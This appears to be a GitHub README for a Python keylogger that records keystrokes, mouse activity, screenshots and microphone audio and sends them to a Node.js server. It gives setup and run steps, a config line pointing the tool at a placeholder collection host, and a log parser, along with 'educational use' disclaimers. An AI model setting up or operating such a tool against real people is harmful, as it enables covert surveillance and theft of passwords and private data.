# Keylogger Project 🎯

## 🌟 Overview

This project captures keyboard, mouse, screenshots, and microphone inputs and sends them to a server or parses the logs for analysis. The keylogger is designed for testing the security of information systems.

## ✨ Features

- 🎹 Captures keyboard and mouse inputs.
- 📸 Takes screenshots and records audio from the microphone.
- 🌐 Sends data to a specified server.
- 📋 Includes a parser for keylog files to decode raw data into readable text.

## 📂 Repository

To start, clone the repository:

```bash
git clone https://github.com/scrollDynasty/Keylogger
cd Keylogger
```

## 🛠️ Requirements

- Python 3.9
- Node.js (for running the server)
- Libraries specified in `requirements.txt`

## 🐍 Installing Python 3.9 on Linux

If Python 3.9 is not installed on your system, follow these steps:

```bash
sudo apt update
sudo apt install -y build-essential zlib1g-dev libffi-dev \
libssl-dev libncurses5-dev libsqlite3-dev libreadline-dev \
libbz2-dev liblzma-dev tk-dev wget

cd /usr/src
sudo wget https://www.python.org/ftp/python/3.9.0/Python-3.9.0.tgz
sudo tar xzf Python-3.9.0.tgz
cd Python-3.9.0
sudo ./configure --enable-optimizations
sudo make altinstall
```

Verify the installation:

```bash
python3.9 --version
```

## ⚙️ Installation and Setup

1. Install required Python dependencies:

   ```bash
   pip install -r requirements.txt
   ```

2. Set up the server:

   - Navigate to the `server` folder:
     ```bash
     cd server
     ```
   - Ensure `server.js` is present in this folder.
   - Start the server:
     ```bash
     node server.js
     ```
   - Keep the server running to receive data from the keylogger.

3. Configure the keylogger:

   - Open `keylogger.py` and set the correct server IP and port:
     ```python
     SERVER_IP = "your.server.ip"
     SERVER_PORT = 8080
     ```

4. Run the keylogger:

   ```bash
   python3.9 keylogger.py
   ```

## 🧰 Using the Keylog Parser

The parser converts raw keylog data into readable text. Here’s how to use it:

1. Run the parser:
   ```bash
   python3.9 keylogparser.py
   ```
2. Paste the raw keylog text into the prompt and press Enter twice to decode.
3. The decoded text will be displayed.

## 📌 Notes

- Use this tool responsibly and only on systems you own or have permission to test.
- Data is sent every 60 seconds by default. You can adjust this interval in `keylogger.py` by modifying `SEND_REPORT_EVERY`.

## 🖼️ Antivirus Test



## 📄 License

This project is licensed under the terms of the [LICENSE](./LICENSE) file.

## 💬 Support and Contact

If you have any issues or questions, feel free to reach out:

- [LinkedIn](https://linkedin.com/in/yunus-ayd%C4%B1n-b9b01a18a/)
- [GitHub](https://github.com/aydinnyunus)
- [Instagram](https://instagram.com/aydinyunus_/)
- [Twitter](https://twitter.com/aydinnyunuss)

### ✨ Update by: scrollDynasty

- [GitHub](https://github.com/scrollDynasty)
- [Instagram](https://instagram.com/scrollDynasty)

## ☕ Donate

Support the development of this project:

- **BTC Wallet:** `1NqDy1VdF5wkvxBcojbADWexPhPzza6LGF`

## ⚠️ Disclaimer

This project is for educational purposes only. The author is not responsible for any misuse of this tool.

---

---

# 🚀 **Version: 1.0.3** 🚀


